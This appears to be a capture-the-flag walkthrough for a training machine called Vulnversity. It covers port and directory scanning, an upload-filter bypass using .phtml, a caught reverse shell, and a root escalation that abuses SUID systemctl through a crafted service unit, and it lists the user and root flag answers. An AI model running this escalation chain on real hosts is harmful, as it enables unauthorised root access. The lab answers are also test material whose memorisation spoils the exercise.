# Vulnversity

## Reconnaissance 

### 1. Scan the box; how many ports are open?

---

````shell
┌──(grimlock㉿GRIMLOCK)-[~]
└─$ nmap -sV -sC 10.10.160.171   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-01 11:35 IST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 5.00% done; ETC: 11:35 (0:00:38 remaining)
Stats: 0:00:30 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 11:35 (0:00:03 remaining)
Nmap scan report for 10.10.160.171
Host is up (0.17s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
````
Answer : 6

---

### 2. What version of the squid proxy is running on the machine?
---
The answer is in the same ouput of nmap 
````shell
┌──(grimlock㉿GRIMLOCK)-[~]
└─$ nmap -sV -sC 10.10.160.171   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-01 11:35 IST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 5.00% done; ETC: 11:35 (0:00:38 remaining)
Stats: 0:00:30 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 11:35 (0:00:03 remaining)
Nmap scan report for 10.10.160.171
Host is up (0.17s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
````
Answer : 3.5.12

---

### 3. How many ports will Nmap scan if the flag -p-400 was used?
---
Answer : 400

---

### 4. What is the most likely operating system this machine is running?
---

Answer : ubuntu

---

### 5. What port is the web server running on?
---

Answer : 3333

---

### 5. What is the flag for enabling verbose mode using Nmap?
---

Answer : -v

---

## Locating directories using Gobuster

### 1. What is the directory that has an upload form page?

---

````shell
┌──(grimlock㉿GRIMLOCK)-[~]
└─$ gobuster dir -u http://10.10.160.171:3333 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.160.171:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 294]
/.htpasswd            (Status: 403) [Size: 299]
/.htaccess            (Status: 403) [Size: 299]
/css                  (Status: 301) [Size: 319] [--> http://10.10.160.171:3333/css/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.160.171:3333/fonts/]
/images               (Status: 301) [Size: 322] [--> http://10.10.160.171:3333/images/]
/index.html           (Status: 200) [Size: 33014]
/internal             (Status: 301) [Size: 324] [--> http://10.10.160.171:3333/internal/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.160.171:3333/js/]
/server-status        (Status: 403) [Size: 303]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
````
Answer : /internal/

---

## Compromise the Webserver

### 1. What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.

Answer : .php

---

### 2. Run this attack, what extension is allowed?

Answer : .phtml

---

---

````shell
┌──(grimlock㉿GRIMLOCK)-[~/hackerdirectory]
└─$  nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.46.12] from (UNKNOWN) [10.10.160.171] 51078
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 02:43:20 up 45 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
$ cd root
/bin/sh: 2: cd: can't cd to root
$ ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
$ cd home
$ ls
bill
$ file bill
bill: directory
$ cd bill
$ ls
user.txt
$ cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb
````

---

### 3. What is the name of the user who manages the webserver?

Answer : bill

---

### 4. What is the user flag?

Answer : 8bd7992fbe8a6ad22a63361004cfcedb

--- 

## Privilege Escalation

---

````shell
$ $ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@vulnuniversity:/$ 
---snipet
www-data@vulnuniversity:/bin$ TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
TF=$(mktemp).service
www-data@vulnuniversity:/bin$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "chmod +s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/bin$ /bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.SEw2A37oIs.service to /tmp/tmp.SEw2A37oIs.service.
www-data@vulnuniversity:/bin$ /bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.SEw2A37oIs.service to /tmp/tmp.SEw2A37oIs.service.
www-data@vulnuniversity:/bin$ bash -p
bash -p
bash-4.3# cd /root
cd /root
bash-4.3# cat root.txt
cat root.txt
a58ff8579f0a9270368d33a9966c7fd5
````

---

### 1. On the system, search for all SUID files. Which file stands out?

Answer : /bin/systemctl

---

### 2. It's challenge time! We have guided you through this far. Can you exploit this system further to escalate your privileges and get the final answer? Become root and get the last flag (/root/root.txt)

Answer : a58ff8579f0a9270368d33a9966c7fd5

---
